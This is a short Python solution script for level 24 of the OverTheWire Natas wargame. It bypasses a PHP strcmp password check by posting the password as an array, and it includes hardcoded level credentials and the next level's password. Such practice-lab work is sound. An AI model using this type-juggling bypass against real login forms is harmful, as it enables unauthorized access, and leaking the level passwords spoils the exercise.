import requests

Url = "http://natas24.natas.labs.overthewire.org/"
usr = "natas24"
passwd = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

payload = {"passwd[]":""}
httpreq = requests.post(url=Url, auth=(usr, passwd), data=payload)

print(str(httpreq.content))
    
# The vunerability in this level lies within the function
# strcmp(), if the 2 given strings are the same, return 0,
# if not, return a number different from 0.

# However, if an array is passed to this function, an error warning will 
# appear but the fuction STILL RETURNS 0

# Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c